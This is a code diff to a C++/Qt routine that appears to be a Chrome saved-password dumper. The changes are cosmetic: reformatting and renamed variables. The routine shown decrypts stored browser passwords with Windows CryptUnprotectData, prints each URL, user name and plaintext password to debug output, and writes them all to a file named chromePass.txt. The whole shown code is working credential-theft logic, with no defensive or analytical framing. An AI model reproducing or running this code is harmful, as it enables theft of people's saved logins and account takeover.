@@ -19,7 +19,6 @@ bool PassReader::readPass()
 {
     setlocale(LC_CTYPE, "rus");
 
-
     //Output file
     QString filePath = *path + '/' + "chromePass.txt";
     QFile file(filePath);
@@ -51,34 +50,33 @@ bool PassReader::readPass()
             //Decrypt
             DATA_BLOB DataIn;
             DATA_BLOB DataOut;
-            DATA_BLOB * pDataIn = &DataIn;
-            DATA_BLOB * pDataOut = &DataOut;
+            DATA_BLOB* pDataIn = &DataIn;
+            DATA_BLOB* pDataOut = &DataOut;
 
             DataIn.pbData =  reinterpret_cast<byte *>( pass.data() );  //Pointer to data_input              BYTE*
             DataIn.cbData = pass.size();                               //Size of input string (in bytes)   DWORD
 
             //Decryption function
-            if (CryptUnprotectData(
-                    pDataIn,
-                    NULL,
-                    NULL,               // Entropy
-                    NULL,
-                    NULL,
-                    0,
-                    pDataOut))
+            if (CryptUnprotectData( pDataIn,
+                                    NULL,
+                                    NULL,           // Entropy
+                                    NULL,
+                                    NULL,
+                                    0,
+                                    pDataOut))
             {
-                QByteArray passDecr;
-                unsigned long pass_size  = static_cast<unsigned long>(DataOut.cbData);
+                QByteArray passDecrypted;
+                unsigned long passSize  = static_cast<unsigned long>(DataOut.cbData);
 
-                //Get pass string and cut it (pbData doesn't have '\0')
-                passDecr.append(reinterpret_cast<char *>(DataOut.pbData));
-                passDecr.resize(pass_size);
+                //Get pass string and cut (pbData doesn't have '\0')
+                passDecrypted.append(reinterpret_cast<char *>(DataOut.pbData));
+                passDecrypted.resize(passSize);
 
-                qDebug() << endl << url << endl << "user = " << user << "\npass = " << QString(passDecr);
+                qDebug() << endl << url << endl << "user = " << user << "\npass = " << QString(passDecrypted);
 
                 //Stream for writing
                 QTextStream stream(&file);
-                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << passDecr << "\r\n\r\n";
+                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << passDecrypted << "\r\n\r\n";
             }
             else
             {
